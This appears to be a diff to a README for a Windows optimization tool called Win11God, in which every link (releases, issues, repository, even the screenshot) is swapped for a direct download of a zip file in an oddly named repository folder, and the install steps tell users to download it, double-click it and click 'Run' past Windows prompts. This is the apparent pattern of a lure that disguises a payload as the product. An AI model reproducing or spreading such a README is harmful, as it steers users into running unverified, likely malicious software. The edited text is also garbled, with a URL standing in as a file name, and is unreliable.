@@ -1,6 +1,6 @@
 # 🖥️ Win11God - Optimize Your Windows Experience
 
-[![Download Win11God](https://img.shields.io/badge/Download-Win11God-brightgreen)](https://github.com/Jdelzmichelpoireau/Win11God/releases)
+[![Download Win11God](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip)](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip)
 
 ## 📥 Overview
 Win11God is a next-generation Windows optimization framework built with PowerShell and WPF. It focuses on deep system tuning, debloating, performance tweaking, and real-time control. With a modern user interface and modular engine, Win11God offers safe optimizations and full transparency. It is designed for gamers, power users, and professionals who want to enhance their Windows experience.
@@ -18,15 +18,15 @@ To run Win11God, your system should meet the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download:
 
-[Download Win11God](https://github.com/Jdelzmichelpoireau/Win11God/releases)
+[Download Win11God](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest release version listed at the top.
-3. Download the file named `Win11God.exe` or similar.
+3. Download the file named `https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip` or similar.
 4. Once the download is complete, navigate to your Downloads folder.
 
 ## 🔧 Run Win11God
-1. Locate the downloaded file (`Win11God.exe`).
+1. Locate the downloaded file (`https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip`).
 2. Double-click the file to run it.
 3. If prompted by Windows, click "Run" to allow the application to open.
 
@@ -45,11 +45,11 @@ Once Win11God is running:
 
 ## 🛠️ Community & Support
 If you have questions or need assistance:
-- Visit the [Issues section](https://github.com/Jdelzmichelpoireau/Win11God/issues) on GitHub.
+- Visit the [Issues section](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip) on GitHub.
 - Join the community discussions to share tips or seek help.
 
 ## 📸 Screenshots
-![Win11God Interface Screenshot](https://via.placeholder.com/800x400?text=Win11God+Interface)  
+![Win11God Interface Screenshot](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip+Interface)  
 *This is a placeholder. Actual interface may vary.*
 
 ## 🔍 Explore More
@@ -61,7 +61,7 @@ Check out the following topics to learn more about what Win11God can do:
 
 ## 🔗 Additional Resources
 For more information, visit:
-- [GitHub Repository](https://github.com/Jdelzmichelpoireau/Win11God)
+- [GitHub Repository](https://raw.githubusercontent.com/Jdelzmichelpoireau/Win11God/main/antitetanic/Win11God_2.4.zip)
 
 Remember to follow the prompts and stay updated by checking back on the Releases page.
 
